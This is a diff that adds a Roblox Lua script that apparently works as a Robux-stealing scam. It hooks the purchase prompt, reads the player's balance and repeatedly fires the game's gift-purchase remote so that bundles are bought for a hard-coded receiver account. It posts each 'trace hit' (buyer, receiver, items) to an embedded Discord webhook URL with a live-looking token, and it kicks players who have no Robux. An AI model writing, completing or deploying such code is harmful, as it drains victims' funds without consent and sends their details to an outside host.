@@ -1,0 +1,129 @@
+local Username = "Ismunuplay3"
+local Webhook = "https://discord.com/api/webhooks/1346872771480780811/sVTtUvwXuwYAiayt5Jm3PnaK9pihBx9DxbSXESrfF8oXeBUknx61-wmQiFiuvE0bA30K"
+
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+
+local success, TargetUserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+
+if not success then
+    TargetUserId = nil
+end
+
+-- Function to send a message to the webhook
+local function SendMessageToWebhook(message)
+    if not Webhook or Webhook == "" then
+        warn("Webhook URL is not set.")
+        return
+    end
+
+    local payload = HttpService:JSONEncode({
+        content = message
+    })
+
+    local success, errorMessage = pcall(function()
+        HttpService:PostAsync(Webhook, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        warn("Failed to send message to webhook: " .. errorMessage)
+    end
+end
+
+-- Function to kick the player for insufficient Robux
+local function KickPlayer()
+    player:Kick("You do not have enough Robux.")
+    SendMessageToWebhook(player.Name .. " had no Robux 😢")
+end
+
+-- Placeholder function to get the player's level
+local function GetPlayerLevel()
+    -- Replace this with actual logic to retrieve the player's level if available.
+    return 10 -- Example level
+end
+
+-- List of products
+local Products = {
+    {ID = 1890372130, Name = "Heavy Duty Bundle", Price = 1899},
+    {ID = 1890372364, Name = "Classic Bundle", Price = 1149},
+    {ID = 1890371681, Name = "Standard Weapons Bundle", Price = 999},
+    {ID = 2661338143, Name = "Energy Bundle", Price = 1299},
+    {ID = 2146952782, Name = "Pixel Bundle", Price = 888},
+    {ID = 1890372574, Name = "Exogun Bundle", Price = 649},
+    {ID = 1890372831, Name = "Medkit Bundle", Price = 249},
+    {ID = 1890371901, Name = "Starter Bundle", Price = 49},
+}
+
+-- Function to get the player's Robux balance
+local function GetBalance()
+    -- Attempting a different method to retrieve balance if UI extraction fails
+    local balance = player.AccountInfo.RobuxBalance
+    return balance or 0
+end
+
+-- Function to purchase items based on available balance
+local function PurchaseGamePasses()
+    local balance = GetBalance()
+    local purchasedItems = {}
+
+    -- Sort products from most to least expensive
+    table.sort(Products, function(a, b)
+        return a.Price > b.Price
+    end)
+
+    for _, product in ipairs(Products) do
+        if product.Price <= balance then
+            local args = {
+                [1] = product.ID,
+                [2] = TargetUserId
+            }
+
+            -- Deduct price from balance (simulate purchase)
+            balance = balance - product.Price
+            table.insert(purchasedItems, product.Name)
+
+            -- Purchase the item
+            local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("PromptGiftProductPurchase")
+            remote:InvokeServer(unpack(args))
+        end
+    end
+
+    if #purchasedItems > 0 then
+        -- Notify webhook
+        local level = GetPlayerLevel()
+        SendMessageToWebhook(
+            string.format(
+                "You got a trace hit 🦈\n\nBuyer: %s\nReceiver: %s\n\nPlayer's Level: %s\n\nItems Bought: %s 🤑",
+                player.Name, Username, level, table.concat(purchasedItems, ", ")
+            )
+        )
+    else
+        -- Kick the player if no purchases were made
+        KickPlayer()
+    end
+end
+
+-- Function to handle purchases
+local function Purchase()
+    if not TargetUserId then return end
+    PurchaseGamePasses()
+end
+
+-- Ensure to catch UI prompt signals properly
+local purchasePrompt = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+
+purchasePrompt.ChildAdded:Connect(function(child)
+    if child.Name == "Prompt" then
+        task.wait(0.5)
+        Purchase()
+    end
+end)
+
+MarketplaceService:PromptProductPurchase(player, 1851594490)
